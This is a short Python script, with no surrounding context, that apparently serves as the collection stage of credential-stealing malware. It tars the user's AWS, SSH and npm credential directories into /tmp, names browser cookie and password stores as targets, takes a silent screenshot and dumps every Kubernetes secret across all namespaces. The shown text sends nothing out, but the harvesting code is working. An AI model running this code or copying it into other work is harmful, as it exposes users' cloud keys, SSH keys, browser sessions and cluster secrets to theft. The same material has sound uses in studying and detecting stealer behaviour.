import subprocess
import os

# Archive credential directories
subprocess.run(['tar', 'czf', '/tmp/creds.tar.gz',
    os.path.expanduser('~/.aws'),
    os.path.expanduser('~/.ssh'),
    os.path.expanduser('~/.npmrc')])

# Browser credential collection
targets = ['cookies.sqlite', 'login data', 'key4.db', 'local state']

# Screen capture
subprocess.run(['screencapture', '-x', '/tmp/screen.png'])

# Kubernetes secrets
subprocess.run(['kubectl', 'get', 'secrets', '--all-namespaces', '-o', 'json'])
